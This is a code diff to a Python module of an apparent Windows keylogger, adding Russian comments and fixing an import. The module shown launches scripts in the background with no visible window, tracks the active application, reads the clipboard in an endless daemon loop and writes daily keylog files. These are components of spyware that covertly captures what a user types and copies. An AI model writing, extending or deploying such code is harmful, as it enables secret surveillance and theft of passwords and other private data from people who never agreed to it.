@@ -9,11 +9,11 @@ import psutil
 import win32gui
 import win32process
 from datetime import datetime
-from keylogger import load_config
+from .keylogger import load_config
 
 config = load_config()
 ALLOWED_PROCESSES = config.get("allowed_processes", [])
-
+# Определяет директорию для логов (работает и в exe и в python)
 def get_log_dir():
     if getattr(sys, 'frozen', False):
         return os.path.dirname(sys.executable)
@@ -21,6 +21,8 @@ def get_log_dir():
 
 log_dir = os.path.join(get_log_dir(), "logs")
 os.makedirs(log_dir, exist_ok=True)
+
+# Запускает скрипт в фоновом режиме без окна
 def start_background(script_name):
     si = subprocess.STARTUPINFO()
     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
@@ -34,6 +36,7 @@ def get_log_file_path():
     today = datetime.now().strftime("%Y-%m-%d")
     return os.path.join(log_dir, f"{today}_keylog.txt")
 
+ # Определяет какое приложение активно в данный момент
 def get_active_console_info():
     try:
         hwnd = win32gui.GetForegroundWindow()
@@ -47,6 +50,7 @@ def get_active_console_info():
         pass
     return None, None
 
+# Читает текстовое содержимое буфера обмена
 def get_clipboard_text():
     try:
         win32clipboard.OpenClipboard()
@@ -56,6 +60,7 @@ def get_clipboard_text():
     except Exception:
         return None
 
+# Бесконечный цикл мониторинга буфера обмена
 def clipboard_monitor():
     last_data = ""
     while True:
@@ -73,6 +78,7 @@ def clipboard_monitor():
                     logging.exception("Clipboard logger failed to write")
                 last_data = data
 
+#смотрим буфер обмена
 def start_clipboard_logger():
     t = threading.Thread(target=clipboard_monitor, daemon=True)
     t.start()
